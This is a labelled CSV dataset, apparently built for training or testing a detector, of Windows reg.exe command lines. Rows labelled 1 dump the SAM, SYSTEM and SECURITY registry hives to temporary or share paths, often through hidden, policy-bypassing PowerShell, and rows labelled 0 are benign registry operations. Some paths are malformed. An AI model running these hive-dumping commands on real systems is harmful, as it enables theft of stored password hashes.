text,label
"cmd /c reg.exe   compare   ""hkcu\hkey_local_machine\system\currentcontrolset\control""   ""hkcu\software\microsoft\windows\currentversion_536""",0
pwsh -noprofile -c reg.exe save   hkey_local_machine\sam %temp%\sec_backup.dat  /y,1
"cmd /c reg.exe   compare   ""hkcu\hkey_local_machine\software\wow6432node""   ""hkcu\hkey_local_machine\software\wow6432node_555""",0
"start /b reg   query   ""hkey_current_user\software\google\chrome""",0
powershell -command reg.exe  save  hklm\sam \\localhost\c$\__dump\sam.bak /y,1
"reg.exe   delete   ""hkey_users\software\google\chrome""",0
powershell -command reg.exe  save   hkey_local_machine\system   \.\c$ackup.reg /y,1
cmd.exe /c reg   save  hklm\sam \.\c$ackup.reg   /y,1
powershell -command reg.exe save   hklm\system  %temp%\sec_backup.dat  /y,1
powershell -exec bypass -w hidden -c reg   save   hkey_local_machine\system \.\c$ackup.reg  /y,1
"reg restore ""hkey_local_machine\software\myapp\settings\subkey65"" ""hkey_local_machine\software\myapp\settings_392""",0
"reg.exe  copy  ""hku\software\classes\subkey72""  ""hku\software\policies\mycorp_744""",0
"cmd /c reg  add  ""hku\software\google\chrome""  /v path  /t reg_sz  /d 1",0
"cmd /c powershell -c ""reg export hklm\system   \\localhost\c$\__dump\sam.bak""",1
"reg.exe restore ""hku\software\policies\mycorp"" ""hku\control panel\desktop_510""",0
"reg.exe query ""hkey_current_user\software\policies\mycorp""",0
"reg  unload  ""hkey_local_machine\hkey_local_machine\software\wow6432node""  /v lastupdate",0
"reg.exe  add  ""hkcu\software\google\chrome\subkey47""  /v path  /t reg_sz",0
cmd.exe /c reg   save   hkey_local_machine\sam c:\users\public\registry_export.reg  /y,1
cmd.exe /c start /b reg.exe   save hklm\security  \.\c$ackup.reg  /y,1
cmd.exe /c reg.exe  export  hklm\system   \\localhost\c$\__dump\sam.bak,1
"powershell -c reg   compare   ""hkcu\environment""   ""hkcu\software\microsoft\windows\currentversion_395""",0
c:\windows\system32\cmd.exe /k reg.exe export hklm\security  %temp%\sec_backup.dat,1
"cmd /c reg restore ""hkey_current_user\system\currentcontrolset\services"" ""hkey_current_user\software\myapp\settings_278""",0
c:\windows\system32\cmd.exe /k reg.exe   save hkey_local_machine\security  c:\temp\system.hive,1
cmd.exe /c start /b reg.exe  save   hkey_local_machine\security  %temp%\sec_backup.dat   /y,1
c:\windows\system32\cmd.exe /k reg   save hkey_local_machine\sam \.\c$ackup.reg,1
pwsh -noprofile -c reg   export hklm\security  %temp%\sec_backup.dat,1
"reg   unload   ""hkey_users\software\myapp\settings""   /v version",0
"powershell -c reg.exe  add  ""hkey_local_machine\system\currentcontrolset\services\subkey24""    /t reg_sz  /d ""c:\program files\app""",0
pwsh -noprofile -c reg   save  hklm\sam   \.\c$ackup.reg,1
"start /b reg.exe   copy   ""hkey_users\system\currentcontrolset\services\subkey99""   ""hkey_users\environment_434""",0
"reg  save  ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey76""  ""d:\backup\registry_hive.dat""",0
pwsh -noprofile -c reg   save hklm\system   \.\c$ackup.reg   /y,1
"start /b reg.exe restore ""hkcu\software\classes\subkey70"" ""hkcu\hkey_local_machine\software\wow6432node_987""",0
"start /b reg.exe  copy  ""hkey_users\software\myapp\settings""  ""hkey_users\software\classes_708""",0
"cmd /c powershell -c ""reg.exe  save hklm\system  \\localhost\c$\__dump\sam.bak""",1
"cmd /c powershell -c ""reg   export   hkey_local_machine\sam  c:\windows\temp\sam.save""",1
cmd.exe /c reg  save   hkey_local_machine\system c:\users\public\registry_export.reg   /y,1
"cmd /c reg.exe save ""hkey_users\environment\subkey73"" ""c:\windows\temp\software_dump.dat"" /y",0
"reg   delete   ""hkey_current_user\software\classes""",0
"powershell -c reg unload ""hkey_local_machine\software\classes\subkey63""",0
pwsh -noprofile -c reg.exe export   hklm\system  \.\c$ackup.reg /y,1
"cmd /c powershell -c ""reg  save  hklm\system  c:\temp\system.hive /y""",1
"powershell -c reg add ""hkcu\software\classes\subkey20""  /t reg_sz /d ""c:\program files\app""",0
reg.exe   save   hklm\sam  \.\c$ackup.reg   /y,1
"cmd /c reg.exe  compare  ""hkey_users\environment\subkey27""  ""hkey_users\software\classes_255""",0
powershell -exec bypass -w hidden -c reg.exe save hklm\sam \\localhost\c$\__dump\sam.bak,1
"reg.exe compare ""hku\control panel\desktop"" ""hku\environment_300""",0
reg.exe   export hklm\sam  \\localhost\c$\__dump\sam.bak,1
"reg.exe   copy   ""hku\system\currentcontrolset\services""   ""hku\software\policies\mycorp_537""",0
cmd.exe /c start /b reg save   hkey_local_machine\sam  \.\c$ackup.reg,1
reg.exe   export  hkey_local_machine\sam   c:\temp\system.hive  /y,1
cmd.exe /c start /b reg   save   hklm\system \.\c$ackup.reg   /y,1
"reg.exe   compare   ""hkey_users\software\myapp\settings""   ""hkey_users\software\myapp\settings_933""",0
"cmd /c reg.exe   save   ""hkey_current_user\control panel\desktop""   ""%temp%\non_sensitive.hive""   /y",0
"reg.exe  restore  ""hkcu\hkey_local_machine\software\wow6432node""  ""hkcu\software\classes_498""",0
c:\windows\system32\cmd.exe /k reg.exe export   hklm\security \\localhost\c$\__dump\sam.bak,1
"reg  query  ""hku\environment""",0
"start /b reg  delete  ""hkey_local_machine\environment\subkey21""  /f",0
powershell -command reg.exe export hkey_local_machine\security  \.\c$ackup.reg  /y,1
powershell -exec bypass -w hidden -c reg.exe save  hkey_local_machine\sam   c:\windows\temp\sam.save   /y,1
pwsh -noprofile -c reg   export  hkey_local_machine\sam \.\c$ackup.reg /y,1
cmd.exe /c start /b reg  export   hklm\system   c:\users\public\registry_export.reg /y,1
powershell -exec bypass -w hidden -c reg   export  hklm\system   \\localhost\c$\__dump\sam.bak /y,1
"cmd /c reg copy ""hku\software\policies\mycorp"" ""hku\software\myapp\settings_319""",0
"reg  compare  ""hkey_local_machine\system\currentcontrolset\services""  ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control_169""",0
reg.exe   export   hkey_local_machine\security \.\c$ackup.reg,1
"reg.exe  copy  ""hku\software\myapp\settings""  ""hku\environment_999""",0
powershell -exec bypass -w hidden -c reg.exe  save  hkey_local_machine\sam c:\temp\system.hive   /y,1
"powershell -c reg.exe   query   ""hkcu\hkey_local_machine\software\wow6432node\subkey32""   /v version",0
reg.exe export   hklm\system   c:\users\public\registry_export.reg /y,1
"powershell -c reg.exe unload ""hku\software\myapp\settings""",0
"powershell -c reg.exe compare ""hkey_current_user\hkey_local_machine\software\policies\microsoft\subkey86"" ""hkey_current_user\software\myapp\settings_359""",0
pwsh -noprofile -c reg.exe  export   hkey_local_machine\sam  c:\temp\system.hive,1
"reg save ""hkey_users\software\policies\mycorp\subkey7"" ""d:\backup\registry_hive.dat""",0
"reg.exe add ""hkey_local_machine\environment"" /v lastupdate /t reg_sz /d 1",0
"cmd /c reg   copy   ""hkcu\environment\subkey16""   ""hkcu\software\policies\mycorp_117""",0
"reg   copy   ""hkcu\control panel\desktop\subkey22""   ""hkcu\environment_390""",0
c:\windows\system32\cmd.exe /k reg.exe  export  hkey_local_machine\sam  \\localhost\c$\__dump\sam.bak,1
"reg   restore   ""hkey_local_machine\environment""   ""hkey_local_machine\system\currentcontrolset\services_613""",0
"cmd /c reg.exe   compare   ""hkey_current_user\environment""   ""hkey_current_user\hkey_local_machine\software\wow6432node_624""",0
"start /b reg.exe   save   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey75""   ""c:\users\public\chrome_data.bak""   /y",0
"reg.exe   save   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey84""   ""%temp%\non_sensitive.hive""",0
pwsh -noprofile -c reg  save   hkey_local_machine\sam  \.\c$ackup.reg   /y,1
"start /b reg copy ""hkey_users\control panel\desktop\subkey70"" ""hkey_users\system\currentcontrolset\services_701""",0
"reg add ""hkey_current_user\control panel\desktop"" /v lastupdate  /d 1",0
"cmd /c powershell -c ""reg  export   hkey_local_machine\sam   \.\c$ackup.reg   /y""",1
"reg.exe  copy  ""hkey_users\software\classes""  ""hkey_users\system\currentcontrolset\services_149""",0
"reg.exe  delete  ""hkey_local_machine\software\classes\subkey89""  /v path",0
"powershell -c reg delete ""hkey_users\hkey_local_machine\software\wow6432node"" /v lastupdate",0
"cmd /c reg.exe   copy   ""hkey_local_machine\environment\subkey86""   ""hkey_local_machine\software\policies\mycorp_712""",0
"start /b reg.exe  add  ""hkey_local_machine\environment\subkey85""  /v lastupdate",0
"reg.exe  query  ""hku\software\classes\subkey58""  /v version",0
"powershell -c reg   restore   ""hkey_current_user\software\policies\mycorp""   ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control_144""",0
"cmd /c powershell -c ""reg export hkey_local_machine\security c:\windows\temp\sam.save  /y""",1
"cmd /c reg query ""hkey_users\software\myapp\settings""",0
"reg copy ""hku\environment"" ""hku\software\google\chrome_104""",0
"reg.exe  save  ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey45""  ""%temp%\non_sensitive.hive""  /y",0
powershell -exec bypass -w hidden -c reg.exe export hkey_local_machine\system   c:\windows\temp\sam.save  /y,1
powershell -command reg  save hkey_local_machine\sam  \\localhost\c$\__dump\sam.bak   /y,1
cmd.exe /c reg   save   hkey_local_machine\sam  %temp%\sec_backup.dat   /y,1
"start /b reg.exe delete ""hkey_local_machine\environment""",0
"reg   restore   ""hku\environment""   ""hku\hkey_local_machine\software\policies\microsoft_932""",0
"cmd /c reg.exe  copy  ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey55""  ""hkey_local_machine\software\google\chrome_595""",0
c:\windows\system32\cmd.exe /k reg   export   hklm\system c:\users\public\registry_export.reg,1
c:\windows\system32\cmd.exe /k reg   save hklm\security \.\c$ackup.reg /y,1
c:\windows\system32\cmd.exe /k reg.exe export  hkey_local_machine\security \.\c$ackup.reg  /y,1
"cmd /c powershell -c ""reg export  hklm\sam  c:\temp\system.hive /y""",1
powershell -command reg  export   hkey_local_machine\sam   \.\c$ackup.reg,1
powershell -exec bypass -w hidden -c reg save  hkey_local_machine\security  c:\windows\temp\sam.save  /y,1
"reg restore ""hku\hkey_local_machine\system\currentcontrolset\control\subkey11"" ""hku\software\myapp\settings_963""",0
"start /b reg.exe save ""hkcu\control panel\desktop"" ""c:\windows\temp\software_dump.dat"" /y",0
"start /b reg   add   ""hku\software\classes""   /v lastupdate   /t reg_dword   /d ""c:\program files\app""",0
"reg.exe  delete  ""hku\hkey_local_machine\software\wow6432node\subkey37""  /v lastupdate",0
reg   export  hkey_local_machine\security  c:\users\public\registry_export.reg,1
"start /b reg.exe  restore  ""hkey_local_machine\hkey_local_machine\software\wow6432node""  ""hkey_local_machine\system\currentcontrolset\services_885""",0
"reg  save  ""hkcu\system\currentcontrolset\services""  ""c:\users\public\chrome_data.bak""  /y",0
"reg  add  ""hkcu\hkey_local_machine\system\currentcontrolset\control""  /v path  /t reg_sz  /d 1",0
cmd.exe /c start /b reg.exe  save   hklm\system   c:\users\public\registry_export.reg,1
cmd.exe /c reg.exe save   hklm\sam   \\localhost\c$\__dump\sam.bak /y,1
pwsh -noprofile -c reg save hklm\system   c:\users\public\registry_export.reg  /y,1
reg.exe  export   hkey_local_machine\security   c:\windows\temp\sam.save /y,1
pwsh -noprofile -c reg.exe   export  hklm\security c:\windows\temp\sam.save,1
cmd.exe /c reg  export  hkey_local_machine\sam \\localhost\c$\__dump\sam.bak   /y,1
"cmd /c reg.exe  add  ""hku\control panel\desktop""  /v version  /t reg_sz  /d ""c:\program files\app""",0
"reg query ""hkey_local_machine\system\currentcontrolset\services\subkey98"" /v lastupdate",0
pwsh -noprofile -c reg   export   hkey_local_machine\system c:\users\public\registry_export.reg /y,1
"cmd /c reg.exe  copy  ""hkey_users\software\google\chrome""  ""hkey_users\control panel\desktop_414""",0
"reg compare ""hkey_local_machine\system\currentcontrolset\services\subkey93"" ""hkey_local_machine\software\policies\mycorp_813""",0
"reg.exe query ""hkcu\hkey_local_machine\software\policies\microsoft"" /v lastupdate",0
"reg.exe  add  ""hkcu\software\microsoft\windows\currentversion\subkey57""    /t reg_sz  /d ""1.0.0""",0
powershell -command reg.exe  save   hkey_local_machine\sam   \.\c$ackup.reg,1
"reg.exe   restore   ""hkey_local_machine\software\google\chrome\subkey54""   ""hkey_local_machine\software\myapp\settings_407""",0
"reg.exe   delete   ""hku\control panel\desktop\subkey55""",0
pwsh -noprofile -c reg   save  hkey_local_machine\system   c:\users\public\registry_export.reg  /y,1
cmd.exe /c start /b reg export hklm\system   c:\users\public\registry_export.reg,1
"cmd /c reg restore ""hkey_current_user\software\google\chrome"" ""hkey_current_user\hkey_local_machine\software\wow6432node_379""",0
"reg save ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey82"" ""c:\temp\user_settings.reg""",0
"reg.exe   restore   ""hkey_local_machine\software\classes\subkey31""   ""hkey_local_machine\software\microsoft\windows\currentversion_816""",0
cmd.exe /c start /b reg save hkey_local_machine\security  \.\c$ackup.reg,1
cmd.exe /c reg.exe save   hkey_local_machine\system  c:\windows\temp\sam.save  /y,1
"cmd /c powershell -c ""reg   export  hklm\security \.\c$ackup.reg /y""",1
pwsh -noprofile -c reg.exe save hkey_local_machine\security c:\users\public\registry_export.reg /y,1
"start /b reg.exe   save   ""hkey_users\software\google\chrome\subkey28""   ""c:\users\public\chrome_data.bak""   /y",0
"reg  add  ""hkcu\control panel\desktop\subkey91""    /t reg_sz  /d ""1.0.0""",0
cmd.exe /c reg.exe   export  hklm\security   c:\windows\temp\sam.save /y,1
"start /b reg.exe restore ""hkey_users\software\microsoft\windows\currentversion"" ""hkey_users\control panel\desktop_678""",0
"start /b reg  add  ""hkey_local_machine\environment\subkey67""  /v path  /t reg_dword  /d ""c:\program files\app""",0
"reg.exe   add   ""hku\software\classes\subkey43""      /t reg_dword",0
pwsh -noprofile -c reg.exe   export   hklm\sam  %temp%\sec_backup.dat   /y,1
"reg unload ""hkey_users\hkey_local_machine\software\wow6432node""",0
"reg  add  ""hkey_current_user\software\google\chrome""  /v version  /t reg_sz  /d 1",0
"cmd /c reg restore ""hku\system\currentcontrolset\services\subkey83"" ""hku\environment_590""",0
"cmd /c powershell -c ""reg  save hkey_local_machine\sam \\localhost\c$\__dump\sam.bak /y""",1
"reg   delete   ""hkcu\system\currentcontrolset\services""   /v lastupdate",0
"reg.exe   save   ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey47""   ""d:\backup\registry_hive.dat""   /y",0
"cmd /c powershell -c ""reg  export  hkey_local_machine\security  %temp%\sec_backup.dat""",1
powershell -exec bypass -w hidden -c reg.exe   save hklm\system  %temp%\sec_backup.dat,1
"start /b reg delete ""hkey_users\software\google\chrome\subkey87"" /v path",0
cmd.exe /c reg  save hkey_local_machine\system   c:\windows\temp\sam.save   /y,1
c:\windows\system32\cmd.exe /k reg  export   hkey_local_machine\system   c:\temp\system.hive,1
c:\windows\system32\cmd.exe /k reg export   hklm\security \\localhost\c$\__dump\sam.bak,1
"reg  delete  ""hkey_users\software\policies\mycorp\subkey53""  /v path",0
reg.exe export hklm\sam   %temp%\sec_backup.dat,1
"reg   compare   ""hkcu\hkey_local_machine\software\wow6432node""   ""hkcu\system\currentcontrolset\services_202""",0
"reg.exe save ""hkey_local_machine\hkey_local_machine\software\wow6432node"" ""c:\windows\temp\software_dump.dat"" /y",0
c:\windows\system32\cmd.exe /k reg.exe  save   hkey_local_machine\security c:\temp\system.hive,1
"powershell -c reg.exe   add   ""hkey_current_user\software\microsoft\windows\currentversion\subkey36""   /f   /t reg_dword   /d ""c:\program files\app""",0
powershell -command reg.exe export   hklm\sam c:\users\public\registry_export.reg  /y,1
"cmd /c reg  unload  ""hku\hkey_local_machine\software\policies\microsoft\subkey33""  /f",0
"cmd /c powershell -c ""reg save   hklm\sam   c:\users\public\registry_export.reg  /y""",1
"start /b reg save ""hkcu\software\microsoft\windows\currentversion"" ""c:\windows\temp\software_dump.dat""",0
powershell -command reg   save   hklm\sam c:\windows\temp\sam.save,1
cmd.exe /c reg.exe   export   hkey_local_machine\system   c:\temp\system.hive  /y,1
pwsh -noprofile -c reg  export hkey_local_machine\sam  c:\temp\system.hive  /y,1
pwsh -noprofile -c reg  save  hkey_local_machine\sam   c:\temp\system.hive   /y,1
reg   save hkey_local_machine\system  c:\temp\system.hive   /y,1
powershell -command reg.exe export   hklm\sam c:\users\public\registry_export.reg /y,1
reg   save   hkey_local_machine\system   c:\temp\system.hive,1
"powershell -c reg  compare  ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control""  ""hkey_local_machine\hkey_local_machine\software\wow6432node_663""",0
"reg.exe unload ""hkcu\software\myapp\settings\subkey5"" /v version",0
"reg save ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey16"" ""c:\users\public\chrome_data.bak""",0
reg  export hkey_local_machine\security   c:\temp\system.hive   /y,1
"reg   restore   ""hkey_current_user\software\google\chrome\subkey54""   ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control_268""",0
"cmd /c powershell -c ""reg  save hklm\sam  c:\users\public\registry_export.reg""",1
"reg.exe   add   ""hkey_users\hkey_local_machine\software\wow6432node""      /t reg_sz   /d ""c:\program files\app""",0
"reg  restore  ""hkey_users\control panel\desktop\subkey40""  ""hkey_users\system\currentcontrolset\services_510""",0
cmd.exe /c start /b reg.exe save  hklm\security   \\localhost\c$\__dump\sam.bak,1
"powershell -c reg.exe copy ""hkey_current_user\software\google\chrome"" ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control_201""",0
reg.exe  export   hklm\system \.\c$ackup.reg   /y,1
cmd.exe /c start /b reg  export  hklm\security c:\windows\temp\sam.save   /y,1
"reg.exe  restore  ""hkcu\hkey_local_machine\software\policies\microsoft\subkey64""  ""hkcu\software\microsoft\windows\currentversion_896""",0
cmd.exe /c reg.exe  save   hklm\security \\localhost\c$\__dump\sam.bak  /y,1
"powershell -c reg  add  ""hkey_local_machine\software\microsoft\windows\currentversion""    /t reg_sz  /d ""c:\program files\app""",0
"reg   delete   ""hkey_local_machine\hkey_local_machine\software\wow6432node""",0
cmd.exe /c reg.exe save hklm\security \\localhost\c$\__dump\sam.bak,1
pwsh -noprofile -c reg.exe  save hkey_local_machine\security \.\c$ackup.reg,1
"powershell -c reg.exe restore ""hku\software\classes"" ""hku\software\google\chrome_960""",0
pwsh -noprofile -c reg export   hklm\sam  \\localhost\c$\__dump\sam.bak,1
cmd.exe /c start /b reg export  hkey_local_machine\system %temp%\sec_backup.dat /y,1
"cmd /c reg.exe  restore  ""hku\hkey_local_machine\software\policies\microsoft""  ""hku\software\microsoft\windows\currentversion_197""",0
"reg.exe   save   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control""   ""d:\backup\registry_hive.dat""",0
reg.exe   save   hklm\system c:\users\public\registry_export.reg,1
c:\windows\system32\cmd.exe /k reg export   hkey_local_machine\security  c:\windows\temp\sam.save /y,1
powershell -command reg.exe  export   hkey_local_machine\security c:\temp\system.hive,1
"powershell -c reg  add  ""hku\software\myapp\settings\subkey94""  /v lastupdate  /t reg_sz  /d 1",0
"powershell -c reg  save  ""hkcu\hkey_local_machine\software\policies\microsoft\subkey91""  ""c:\windows\temp\software_dump.dat""",0
"cmd /c powershell -c ""reg.exe  export hkey_local_machine\system  %temp%\sec_backup.dat""",1
"reg.exe   query   ""hkey_users\hkey_local_machine\software\policies\microsoft""   /v version",0
reg   save hklm\system \\localhost\c$\__dump\sam.bak  /y,1
"reg.exe save ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey19"" ""c:\users\public\chrome_data.bak"" /y",0
pwsh -noprofile -c reg.exe save  hkey_local_machine\sam   c:\windows\temp\sam.save /y,1
powershell -command reg   export hklm\sam c:\windows\temp\sam.save,1
"cmd /c reg.exe   query   ""hkcu\software\google\chrome""",0
"reg add ""hkey_local_machine\software\classes"" /v path /t reg_dword /d ""c:\program files\app""",0
"reg unload ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control""",0
reg.exe   save  hkey_local_machine\system c:\windows\temp\sam.save /y,1
cmd.exe /c reg.exe export   hkey_local_machine\security c:\windows\temp\sam.save /y,1
pwsh -noprofile -c reg.exe save   hkey_local_machine\system c:\temp\system.hive,1
"reg restore ""hkey_users\software\myapp\settings\subkey88"" ""hkey_users\control panel\desktop_699""",0
"reg   add   ""hkcu\hkey_local_machine\software\wow6432node""   /v version   /t reg_sz   /d ""1.0.0""",0
"reg  save  ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey27""  ""c:\temp\user_settings.reg""",0
powershell -command reg  save  hkey_local_machine\sam   %temp%\sec_backup.dat,1
c:\windows\system32\cmd.exe /k reg.exe save  hkey_local_machine\sam  c:\windows\temp\sam.save,1
"cmd /c powershell -c ""reg.exe save hkey_local_machine\sam  c:\temp\system.hive  /y""",1
cmd.exe /c start /b reg.exe  export  hkey_local_machine\security  c:\temp\system.hive  /y,1
"reg  restore  ""hkey_users\software\myapp\settings""  ""hkey_users\environment_842""",0
cmd.exe /c start /b reg  save hklm\security %temp%\sec_backup.dat /y,1
"reg.exe   add   ""hkey_current_user\software\policies\mycorp""   /v lastupdate   /t reg_sz   /d ""c:\program files\app""",0
powershell -exec bypass -w hidden -c reg.exe   save   hkey_local_machine\security  \.\c$ackup.reg,1
powershell -exec bypass -w hidden -c reg.exe export   hklm\sam c:\temp\system.hive,1
"reg.exe   query   ""hku\hkey_local_machine\software\wow6432node\subkey72""   /v lastupdate",0
"reg.exe  delete  ""hkey_current_user\software\classes\subkey99""",0
cmd.exe /c reg   save   hklm\system \.\c$ackup.reg,1
powershell -exec bypass -w hidden -c reg   save   hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak,1
"reg.exe add ""hkcu\hkey_local_machine\system\currentcontrolset\control"" /v lastupdate  /d 1",0
"start /b reg.exe copy ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey67"" ""hkey_local_machine\software\policies\mycorp_837""",0
cmd.exe /c reg export hkey_local_machine\system c:\windows\temp\sam.save,1
powershell -command reg.exe export   hklm\sam  \\localhost\c$\__dump\sam.bak,1
cmd.exe /c start /b reg export  hkey_local_machine\security   c:\temp\system.hive,1
pwsh -noprofile -c reg   export  hkey_local_machine\system c:\windows\temp\sam.save   /y,1
"powershell -c reg.exe   save   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft""   ""c:\temp\user_settings.reg""",0
"cmd /c powershell -c ""reg  save   hklm\security   \\localhost\c$\__dump\sam.bak   /y""",1
cmd.exe /c start /b reg  export hkey_local_machine\system c:\windows\temp\sam.save,1
cmd.exe /c start /b reg   export hkey_local_machine\system   \\localhost\c$\__dump\sam.bak /y,1
powershell -command reg.exe   export  hklm\security \\localhost\c$\__dump\sam.bak   /y,1
cmd.exe /c start /b reg save hklm\sam c:\users\public\registry_export.reg   /y,1
"powershell -c reg.exe  unload  ""hkey_local_machine\system\currentcontrolset\services""  /v lastupdate",0
"cmd /c powershell -c ""reg.exe  save  hklm\sam  c:\users\public\registry_export.reg  /y""",1
"cmd /c reg copy ""hkey_current_user\software\myapp\settings\subkey93"" ""hkey_current_user\software\policies\mycorp_425""",0
pwsh -noprofile -c reg.exe export hklm\security   c:\users\public\registry_export.reg,1
"reg.exe restore ""hkey_local_machine\hkey_local_machine\software\wow6432node"" ""hkey_local_machine\hkey_local_machine\software\policies\microsoft_957""",0
"reg  copy  ""hkcu\hkey_local_machine\software\wow6432node\subkey26""  ""hkcu\control panel\desktop_470""",0
reg.exe   save hklm\security  \.\c$ackup.reg,1
"cmd /c powershell -c ""reg   save   hklm\security %temp%\sec_backup.dat /y""",1
cmd.exe /c start /b reg export hklm\security  c:\windows\temp\sam.save,1
"reg.exe  add  ""hkey_users\hkey_local_machine\software\wow6432node""  /v lastupdate  /t reg_dword",0
cmd.exe /c start /b reg   save hklm\sam   \.\c$ackup.reg,1
"cmd /c powershell -c ""reg   export hklm\sam  %temp%\sec_backup.dat""",1
"reg  unload  ""hkey_current_user\hkey_local_machine\software\wow6432node""  /f",0
powershell -command reg  save hkey_local_machine\system  c:\temp\system.hive,1
"reg.exe delete ""hkey_current_user\software\myapp\settings\subkey6"" /v lastupdate",0
"powershell -c reg.exe  query  ""hku\hkey_local_machine\software\wow6432node\subkey17""",0
"reg   copy   ""hkey_local_machine\software\google\chrome""   ""hkey_local_machine\software\myapp\settings_497""",0
powershell -command reg.exe export  hkey_local_machine\system  c:\windows\temp\sam.save   /y,1
reg.exe export  hklm\system  c:\temp\system.hive   /y,1
cmd.exe /c reg.exe  export  hkey_local_machine\security  c:\users\public\registry_export.reg  /y,1
"start /b reg   unload   ""hkey_local_machine\environment""   /v path",0
"reg.exe   unload   ""hkey_users\system\currentcontrolset\services""   /f",0
reg  export  hkey_local_machine\system c:\windows\temp\sam.save  /y,1
"reg delete ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control"" /v path",0
pwsh -noprofile -c reg   save hkey_local_machine\system  c:\windows\temp\sam.save,1
pwsh -noprofile -c reg.exe export hkey_local_machine\security c:\temp\system.hive   /y,1
c:\windows\system32\cmd.exe /k reg.exe  export hkey_local_machine\sam c:\users\public\registry_export.reg,1
c:\windows\system32\cmd.exe /k reg.exe   save hklm\sam   c:\temp\system.hive /y,1
powershell -command reg   save  hkey_local_machine\security  %temp%\sec_backup.dat,1
"reg delete ""hkey_current_user\software\google\chrome\subkey98"" /v lastupdate",0
"reg.exe unload ""hkey_current_user\control panel\desktop\subkey43"" /f",0
cmd.exe /c start /b reg   export   hkey_local_machine\sam   \.\c$ackup.reg  /y,1
powershell -exec bypass -w hidden -c reg export   hklm\sam  c:\temp\system.hive,1
"reg.exe   save   ""hku\software\classes\subkey89""   ""c:\temp\user_settings.reg""",0
"reg   unload   ""hkcu\hkey_local_machine\system\currentcontrolset\control""   /v version",0
reg  save hklm\sam   c:\users\public\registry_export.reg  /y,1
"powershell -c reg.exe   unload   ""hku\environment\subkey92""   /v lastupdate",0
reg  save hklm\sam  c:\windows\temp\sam.save,1
"reg.exe   save   ""hkey_users\hkey_local_machine\software\policies\microsoft""   ""c:\users\public\chrome_data.bak""   /y",0
"reg.exe   save   ""hkcu\software\policies\mycorp""   ""%temp%\non_sensitive.hive""",0
"reg.exe   delete   ""hkey_current_user\software\myapp\settings\subkey91""",0
cmd.exe /c start /b reg   save hklm\system   %temp%\sec_backup.dat,1
pwsh -noprofile -c reg.exe  save   hklm\sam   c:\windows\temp\sam.save,1
powershell -exec bypass -w hidden -c reg.exe export   hkey_local_machine\system   c:\users\public\registry_export.reg,1
"reg.exe query ""hkey_local_machine\environment\subkey89""",0
pwsh -noprofile -c reg export   hkey_local_machine\security   c:\windows\temp\sam.save /y,1
powershell -command reg.exe   save   hklm\system  \.\c$ackup.reg /y,1
"reg copy ""hku\environment\subkey85"" ""hku\hkey_local_machine\software\wow6432node_396""",0
"reg.exe   unload   ""hkcu\system\currentcontrolset\services""   /f",0
"powershell -c reg.exe unload ""hku\hkey_local_machine\software\wow6432node\subkey53"" /v lastupdate",0
"reg.exe add ""hkey_users\software\policies\mycorp\subkey79"" /f /t reg_sz",0
cmd.exe /c reg   save   hklm\security  c:\users\public\registry_export.reg  /y,1
"reg   restore   ""hku\hkey_local_machine\system\currentcontrolset\control\subkey35""   ""hku\software\microsoft\windows\currentversion_716""",0
reg  save   hklm\system c:\temp\system.hive,1
"reg  unload  ""hkey_users\system\currentcontrolset\services\subkey15""  /v lastupdate",0
pwsh -noprofile -c reg.exe   export   hklm\system  c:\windows\temp\sam.save  /y,1
"cmd /c powershell -c ""reg   save  hklm\sam \\localhost\c$\__dump\sam.bak""",1
powershell -exec bypass -w hidden -c reg  save hklm\sam c:\windows\temp\sam.save  /y,1
